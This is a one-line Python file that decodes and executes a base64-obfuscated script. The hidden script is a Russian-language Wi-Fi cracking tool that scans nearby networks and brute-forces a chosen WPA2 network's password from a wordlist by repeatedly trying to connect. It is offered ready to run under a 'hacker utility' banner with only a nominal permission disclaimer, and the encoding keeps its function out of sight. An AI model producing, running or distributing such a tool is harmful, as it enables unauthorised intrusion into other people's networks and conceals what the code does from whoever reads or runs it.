import base64;exec(base64.b64decode('aW1wb3J0IG9zCmltcG9ydCB0aW1lCmltcG9ydCBzdWJwcm9jZXNzCmltcG9ydCBweXdpZmkKZnJvbSBweXdpZmkgaW1wb3J0IGNvbnN0CmltcG9ydCBzeXMKaW1wb3J0IGNvbXR5cGVzCgoKZGVmIHdpcGluZygpOgogICAgb3Muc3lzdGVtKCdjbHMnIGlmIG9zLm5hbWUgPT0gJ250JyBlbHNlICdjbGVhcicpCgpkZWYgY3JlYXRlX2dyYWRpZW50KHRleHQsIHN0YXJ0X3JnYj0oMjU1LCAxNDAsIDApLCBlbmRfcmdiPSgxNDgsIDAsIDIxMSkpOgogICAgbGluZXMsIHJlc3VsdCA9IHRleHQuc3BsaXRsaW5lcygpLCBbXQogICAgZm9yIGxpbmUgaW4gbGluZXM6CiAgICAgICAgY29sb3JlZF9saW5lID0gIiIKICAgICAgICBpZiBsaW5lLnN0cmlwKCk6CiAgICAgICAgICAgIGxlbmd0aCA9IGxlbihsaW5lKQogICAgICAgICAgICBmb3IgaSwgY2hhciBpbiBlbnVtZXJhdGUobGluZSk6CiAgICAgICAgICAgICAgICByYXRpbyA9IGkgLyBtYXgoMSwgbGVuZ3RoIC0gMSkKICAgICAgICAgICAgICAgIHIgPSBpbnQoc3RhcnRfcmdiWzBdICogKDEgLSByYXRpbykgKyBlbmRfcmdiWzBdICogcmF0aW8pCiAgICAgICAgICAgICAgICBnID0gaW50KHN0YXJ0X3JnYlsxXSAqICgxIC0gcmF0aW8pICsgZW5kX3JnYlsxXSAqIHJhdGlvKQogICAgICAgICAgICAgICAgYiA9IGludChzdGFydF9yZ2JbMl0gKiAoMSAtIHJhdGlvKSArIGVuZF9yZ2JbMl0gKiByYXRpbykKICAgICAgICAgICAgICAgIGNvbG9yZWRfbGluZSArPSBmIlwwMzNbMzg7Mjt7cn07e2d9O3tifW17Y2hhcn1cMDMzWzBtIgogICAgICAgIGVsc2U6CiAgICAgICAgICAgIGNvbG9yZWRfbGluZSA9IGxpbmUKICAgICAgICByZXN1bHQuYXBwZW5kKGNvbG9yZWRfbGluZSkKICAgIHJldHVybiAiXG4iLmpvaW4ocmVzdWx0KQoKCmRlZiBzaG93X2xvZ28oKToKICAgIGJhbm5lciA9ICIiIgrilZTilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZcK4pWRICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICDilZEK4pWRICAgIOKWiOKWiOKWiOKWiOKWiOKWiOKVlyDilojilojilojilojilojilojilZcg4paI4paI4pWXICAg4paI4paI4pWX4paI4paI4pWXICDilojilojilZcgICAg4paI4paI4pWXICAgIOKWiOKWiOKVl+KWiOKWiOKVl+KWiOKWiOKWiOKWiOKWiOKWiOKWiOKVl+KWiOKWiOKVlyAgICAgICAgIOKVkQrilZEgICAg4paI4paI4pWU4pWQ4pWQ4paI4paI4pWX4paI4paI4pWU4pWQ4pWQ4paI4paI4pWX4paI4paI4pWRICAg4paI4paI4pWR4paI4paI4pWRICDilojilojilZEgICAg4paI4paI4pWRICAgIOKWiOKWiOKVkeKWiOKWiOKVkeKWiOKWiOKVlOKVkOKVkOKVkOKVkOKVneKWiOKWiOKVkSAgICAgICAgIOKVkQrilZEgICAg4paI4paI4paI4paI4paI4paI4pWU4pWd4paI4paI4paI4paI4paI4paI4pWU4pWd4paI4paI4pWRICAg4paI4paI4pWR4paI4paI4paI4paI4paI4paI4paI4pWRICAgIOKWiOKWiOKVkSDilojilZcg4paI4paI4pWR4paI4paI4pWR4paI4paI4paI4paI4paI4pWXICDilojilojilZEgICAgICAgICDilZEK4pWRICAgIOKWiOKWiOKVlOKVkOKVkOKWiOKWiOKVl+KWiOKWiOKVlOKVkOKVkOKWiOKWiOKVl+KWiOKWiOKVkSAgIOKWiOKWiOKVkeKWiOKWiOKVlOKVkOKVkOKWiOKWiOKVkSAgICDilojilojilZHilojilojilojilZfilojilojilZHilojilojilZHilojilojilZTilZDilZDilZ0gIOKWiOKWiOKVkSAgICAgICAgIOKVkQrilZEgICAg4paI4paI4paI4paI4paI4paI4pWU4pWd4paI4paI4pWRICDilojilojilZHilZrilojilojilojilojilojilojilZTilZ3ilojilojilZEgIOKWiOKWiOKVkSAgICDilZrilojilojilojilZTilojilojilojilZTilZ3ilojilojilZHilojilojilZEgICAgIOKWiOKWiOKVkSAgICAgICAgIOKVkQrilZEgICAg4pWa4pWQ4pWQ4pWQ4pWQ4pWQ4pWdIOKVmuKVkOKVnSAg4pWa4pWQ4pWdIOKVmuKVkOKVkOKVkOKVkOKVkOKVnSDilZrilZDilZ0gIOKVmuKVkOKVnSAgICAg4pWa4pWQ4pWQ4pWd4pWa4pWQ4pWQ4pWdIOKVmuKVkOKVneKVmuKVkOKVnSAgICAg4pWa4pWQ4pWdICAgICAgICAg4pWRCuKVkSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg4pWRCuKVkSAgICAgICDQpdCw0LrQtdGA0YHQutCw0Y8g0YPRgtC40LvQuNGC0LAg0LTQu9GPINGC0LXRgdGC0LjRgNC+0LLQsNC90LjRjyDQstCw0Lkt0YTQsNC5INGB0LXRgtC10LkgdjEuNCAgICAgICAgICAgICAg4pWRCuKVkSAgICAgICDQmNGB0L/QvtC70YzQt9GD0Lkg0YLQvtC70YzQutC+INC90LAg0YHQstC+0LjRhSDRgdC10YLRj9GFINC40LvQuCDRgSDRgNCw0LfRgNC10YjQtdC90LjRjyEgICAgICAgICAgICAgICAgICDilZEK4pWRICAgICAgINCg0LDQt9GA0LDQsdC+0YLRh9C40LrQuDogQEZHQnJ1aCAmIEBCcnVoWW91VGVldGggfCDQmtCw0L3QsNC7OiBARkdJQURWICDRgdCw0LEg0L/Qu9C40LcgICDilZEK4pWRICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICDilZEK4pWa4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWdCiAgICAiIiIKICAgIHByaW50KGNyZWF0ZV9ncmFkaWVudChiYW5uZXIpKQoKCmRlZiBzY2FuX3dpZmkoKToKICAgIHdpZmkgPSBweXdpZmkuUHlXaUZpKCkKICAgIGlmYWNlID0gd2lmaS5pbnRlcmZhY2VzKClbMF0KCiAgICBpZmFjZS5zY2FuKCkKICAgIHRpbWUuc2xlZXAoMikKCiAgICBuZXRzID0gaWZhY2Uuc2Nhbl9yZXN1bHRzKCkKICAgIHJldHVybiBuZXRzCgoKZGVmIHNob3dfbmV0cyhuZXRzKToKICAgIGlmIG5vdCBuZXRzOgogICAgICAgIHByaW50KCLQndC1INGD0LTQsNC70L7RgdGMLiDQp9C10LrQvdC4INGB0LLQvtC5INCy0LDQuS3RhNCw0Lkg0LDQtNCw0L/RgtC10YAuIikKICAgICAgICByZXR1cm4gRmFsc2UKCiAgICBwcmludCgiXG7QlNC+0YHRgtGD0L/QvdGL0LUg0YLQvtGH0LrQuCDQtNC+0YHRgtGD0L/QsDoiKQogICAgcHJpbnQoZiJ7J+KElic6NH0geyfQmNC80Y8g0YHQtdGC0LgnOjI1fSB7J9Ch0LjQs9C90LDQuyc6MTB9IHsn0JfQsNGJ0LjRgtCwJ30iKQogICAgcHJpbnQoIi0iICogNjApCgogICAgdW5pcXVlX25ldHMgPSB7fQogICAgZm9yIGksIG5ldCBpbiBlbnVtZXJhdGUobmV0cyk6CiAgICAgICAgaWYgbm90IG5ldC5zc2lkOgogICAgICAgICAgICBjb250aW51ZQoKICAgICAgICBpZiBuZXQuc3NpZCBub3QgaW4gdW5pcXVlX25ldHM6CiAgICAgICAgICAgIHVuaXF1ZV9uZXRzW25ldC5zc2lkXSA9IHsKICAgICAgICAgICAgICAgICdpbmRleCc6IGkgKyAxLAogICAgICAgICAgICAgICAgJ3NzaWQnOiBuZXQuc3NpZCwKICAgICAgICAgICAgICAgICdzaWduYWwnOiBuZXQuc2lnbmFsLAogICAgICAgICAgICAgICAgJ2FrbSc6IG5ldC5ha20KICAgICAgICAgICAgfQoKICAgIGZvciBpLCAoc3NpZCwgaW5mbykgaW4gZW51bWVyYXRlKHVuaXF1ZV9uZXRzLml0ZW1zKCkpOgogICAgICAgIHNlY3VyaXR5ID0gItCe0YLQutGA0YvRgtCw0Y8iIGlmIGluZm9bJ2FrbSddID09IGNvbnN0LkFLTV9UWVBFX05PTkUgZWxzZSAi0JfQsNGJ0LjRidC10L3QsCIKICAgICAgICBzaWduYWxfc3RyZW5ndGggPSBmIntpbmZvWydzaWduYWwnXX0lIgogICAgICAgIHByaW50KGYie2kgKyAxOjw0fSB7aW5mb1snc3NpZCddOjwyNX0ge3NpZ25hbF9zdHJlbmd0aDo8MTB9IHtzZWN1cml0eX0iKQoKICAgIHJldHVybiBsaXN0KHVuaXF1ZV9uZXRzLnZhbHVlcygpKQoKCmRlZiBnZXRfcGFzc2VzKHdvcmRsaXN0X3BhdGgpOgogICAgdHJ5OgogICAgICAgIHdpdGggb3Blbih3b3JkbGlzdF9wYXRoLCAncicsIGVuY29kaW5nPSd1dGYtOCcsIGVycm9ycz0naWdub3JlJykgYXMgZjoKICAgICAgICAgICAgcmV0dXJuIFtsaW5lLnN0cmlwKCkgZm9yIGxpbmUgaW4gZiBpZiBsaW5lLnN0cmlwKCldCiAgICBleGNlcHQgRmlsZU5vdEZvdW5kRXJyb3I6CiAgICAgICAgcHJpbnQoZiLQntGI0LjQsdC60LA6INCh0LvQvtCy0LDRgNGMICd7d29yZGxpc3RfcGF0aH0nINC90LUg0L3QsNC50LTQtdC9LiDQn9GA0L7QstC10YDRjCDQv9GD0YLRjCEiKQogICAgICAgIHJldHVybiBOb25lCgoKZGVmIGNoZWNrX3Bhc3MoaWZhY2UsIHByb2ZpbGUsIHBhc3N3b3JkKToKICAgIHByb2ZpbGUua2V5ID0gcGFzc3dvcmQKICAgIGlmYWNlLnJlbW92ZV9hbGxfbmV0d29ya19wcm9maWxlcygpCiAgICB0ZW1wX3Byb2ZpbGUgPSBpZmFjZS5hZGRfbmV0d29ya19wcm9maWxlKHByb2ZpbGUpCgogICAgaWZhY2UuY29ubmVjdCh0ZW1wX3Byb2ZpbGUpCiAgICB0aW1lLnNsZWVwKDIpCgogICAgaWYgaWZhY2Uuc3RhdHVzKCkgPT0gY29uc3QuSUZBQ0VfQ09OTkVDVEVEOgogICAgICAgIHJldHVybiBUcnVlCiAgICBlbHNlOgogICAgICAgIHJldHVybiBGYWxzZQoKCmRlZiBjcmFjayhzc2lkLCB3b3JkbGlzdCk6CiAgICB3aWZpID0gcHl3aWZpLlB5V2lGaSgpCiAgICBpZmFjZSA9IHdpZmkuaW50ZXJmYWNlcygpWzBdCgogICAgcHJvZmlsZSA9IHB5d2lmaS5Qcm9maWxlKCkKICAgIHByb2ZpbGUuc3NpZCA9IHNzaWQKICAgIHByb2ZpbGUuYXV0aCA9IGNvbnN0LkFVVEhfQUxHX09QRU4KICAgIHByb2ZpbGUuYWttLmFwcGVuZChjb25zdC5BS01fVFlQRV9XUEEyUFNLKQogICAgcHJvZmlsZS5jaXBoZXIgPSBjb25zdC5DSVBIRVJfVFlQRV9DQ01QCgogICAgdG90YWwgPSBsZW4od29yZGxpc3QpCgogICAgcHJpbnQoZiJcbtCd0LDRh9C40L3QsNGOINCx0YDRg9GC0YTQvtGA0YEg0YHQtdGC0LggJ3tzc2lkfScuLi4iKQogICAgcHJpbnQoZiLQktGB0LXQs9C+INC/0LDRgNC+0LvQtdC5INC90LAg0L/QtdGA0LXQsdC+0YA6IHt0b3RhbH0iKQoKICAgIGZvciBpLCBwd2QgaW4gZW51bWVyYXRlKHdvcmRsaXN0KToKICAgICAgICBpZiBpICUgMTAgPT0gMCBvciBpID09IHRvdGFsIC0gMToKICAgICAgICAgICAgcHJvZ3Jlc3MgPSAoaSArIDEpIC8gdG90YWwgKiAxMDAKICAgICAgICAgICAgcHJpbnQoZiJcctCf0YDQvtCz0YDQtdGB0YE6IFt7aSArIDF9L3t0b3RhbH1dIHtwcm9ncmVzczouMmZ9JSAtINCf0YDQvtCx0YPRjjoge3B3ZFs6MTVdOjwxNX0iLCBlbmQ9IiIpCgogICAgICAgIGlmIGNoZWNrX3Bhc3MoaWZhY2UsIHByb2ZpbGUsIHB3ZCk6CiAgICAgICAgICAgIHByaW50KGYiXG5cbtCf0JDQoSDQndCQ0JnQlNCV0J0hINCf0LDRgNC+0LvRjCDQtNC70Y8gJ3tzc2lkfSc6IHtwd2R9IikKICAgICAgICAgICAgcmV0dXJuIFRydWUKCiAgICBwcmludChmIlxuXG7Qn9Cw0YEg0L3QtSDQvdCw0LnQtNC10L0g0LIg0YHQu9C+0LLQsNGA0LUg0LTQu9GPICd7c3NpZH0nLiDQn9C+0L/RgNC+0LHRg9C5INC00YDRg9Cz0L7QuSDRgdC70L7QstCw0YDRjC4iKQogICAgcmV0dXJuIEZhbHNlCgoKZGVmIGdvKCk6CiAgICB3b3JkbGlzdF9wYXRoID0gIkJydWhfd29yZGxpc3QudHh0IgoKICAgIHdoaWxlIFRydWU6CiAgICAgICAgd2lwaW5nKCkKICAgICAgICBzaG93X2xvZ28oKQoKICAgICAgICBwcmludCgiXG7QktGL0LHQtdGA0Lgg0YfRgtC+INC00LXQu9Cw0YLRjDoiKQogICAgICAgIHByaW50KCIxLiDQn9GA0L7RgdC60LDQvdC40YLRjCDQtNC+0YHRgtGD0L/QvdGL0LUg0LLQsNC5LdGE0LDQuSDRgdC10YLQuCIpCiAgICAgICAgcHJpbnQoIjIuINCd0LDRh9Cw0YLRjCDQsdGA0YPRgtGE0L7RgNGBINGBINC60LDRgdGC0L7QvNC90YvQvNC4INC/0LDRgNCw0LzQtdGC0YDQsNC80LgiKQogICAgICAgIHByaW50KCIzLiDQktGL0LnRgtC4IikKCiAgICAgICAgY2hvaWNlID0gaW5wdXQoIlxu0JLQstC10LTQuCDRhtC40YTRgNGDICgxLTMpOiAiKQoKICAgICAgICBpZiBjaG9pY2UgPT0gJzEnOgogICAgICAgICAgICBwcmludCgiXG7QodC60LDQvdC40YDRg9GOINGN0YTQuNGALCDQv9C+0LPQvtC00Lgg0YfRg9GC0LrQsC4uLiIpCiAgICAgICAgICAgIG5ldHMgPSBzY2FuX3dpZmkoKQogICAgICAgICAgICBuZXRfaW5mbyA9IHNob3dfbmV0cyhuZXRzKQoKICAgICAgICAgICAgaWYgbmV0X2luZm86CiAgICAgICAgICAgICAgICB3aGlsZSBUcnVlOgogICAgICAgICAgICAgICAgICAgIHRhcmdldCA9IGlucHV0KCJcbtCS0YvQsdC10YDQuCDQvdC+0LzQtdGAINGB0LXRgtC4INC00LvRjyDQstC30LvQvtC80LAgKDAg0LTQu9GPINCy0L7Qt9Cy0YDQsNGC0LAg0LIg0LzQtdC90Y4pOiAiKQoKICAgICAgICAgICAgICAgICAgICBpZiB0YXJnZXQgPT0gJzAnOgogICAgICAgICAgICAgICAgICAgICAgICBicmVhawoKICAgICAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgICAgIHRhcmdldF9pZHggPSBpbnQodGFyZ2V0KSAtIDEKICAgICAgICAgICAgICAgICAgICAgICAgaWYgMCA8PSB0YXJnZXRfaWR4IDwgbGVuKG5ldF9pbmZvKToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGVjdGVkID0gbmV0X2luZm9bdGFyZ2V0X2lkeF0KCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB3b3JkbGlzdCA9IGdldF9wYXNzZXMod29yZGxpc3RfcGF0aCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHdvcmRsaXN0OgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNyYWNrKHNlbGVjdGVkWydzc2lkJ10sIHdvcmRsaXN0KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlucHV0KCJcbtCW0LzQsNC60L3QuCBFbnRlciDQtNC70Y8g0L/RgNC+0LTQvtC70LbQtdC90LjRjy4uLiIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KCLQndC10L/RgNCw0LLQuNC70YzQvdGL0Lkg0LLRi9Cx0L7RgCwg0YLRiyDRh9C1PyIpCiAgICAgICAgICAgICAgICAgICAgZXhjZXB0IFZhbHVlRXJyb3I6CiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KCLQndGD0LbQvdC+INGH0LjRgdC70L4sINCwINC90LUg0LLQvtGCINGN0YLQviDQstC+0YIg0LLRgdGRISIpCgogICAgICAgICAgICBpbnB1dCgiXG7QltC80LDQutC90LggRW50ZXIg0LTQu9GPINC/0YDQvtC00L7Qu9C20LXQvdC40Y8uLi4iKQoKICAgICAgICBlbGlmIGNob2ljZSA9PSAnMic6CiAgICAgICAgICAgIHNzaWQgPSBpbnB1dCgiXG7QktCy0LXQtNC4INC90LDQt9Cy0LDQvdC40LUg0LLQsNC5LdGE0LDQuSDRgdC10YLQuCAoU1NJRCk6ICIpCgogICAgICAgICAgICB3b3JkbGlzdCA9IGdldF9wYXNzZXMod29yZGxpc3RfcGF0aCkKICAgICAgICAgICAgaWYgd29yZGxpc3QgYW5kIHNzaWQ6CiAgICAgICAgICAgICAgICBjcmFjayhzc2lkLCB3b3JkbGlzdCkKICAgICAgICAgICAgICAgIGlucHV0KCJcbtCW0LzQsNC60L3QuCBFbnRlciDQtNC70Y8g0L/RgNC+0LTQvtC70LbQtdC90LjRjy4uLiIpCgogICAgICAgIGVsaWYgY2hvaWNlID09ICczJzoKICAgICAgICAgICAgcHJpbnQoIlxu0JfQsNC60YDRi9Cy0LDRjiDQv9GA0L7Qs9GDLiDQlNCw0LLQsNC5LCDQtNC+INGB0LLRj9C30LghIikKICAgICAgICAgICAgc3lzLmV4aXQoMCkKCiAgICAgICAgZWxzZToKICAgICAgICAgICAgcHJpbnQoItCd0LXRgiDRgtCw0LrQvtCz0L4g0LLQsNGA0LjQsNC90YLQsCwg0YLRiyDRh9GC0L4g0YHQu9C10L/QvtC5PyIpCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMSkKCgppZiBfX25hbWVfXyA9PSAiX19tYWluX18iOgogICAgdHJ5OgogICAgICAgIGltcG9ydCBweXdpZmkKICAgIGV4Y2VwdCBJbXBvcnRFcnJvcjoKICAgICAgICBwcmludCgi0J3QtSDRhdCy0LDRgtCw0LXRgiDQsdC40LHQu9C40L7RgtC10LouINCj0YHRgtCw0L3QvtCy0Lgg0L/QsNC60LXRgtGLINC60L7QvNCw0L3QtNC+0Lk6IikKICAgICAgICBwcmludCgicGlwIGluc3RhbGwgcHl3aWZpIikKICAgICAgICBzeXMuZXhpdCgxKQoKICAgIGdvKCk=').decode('utf-8'))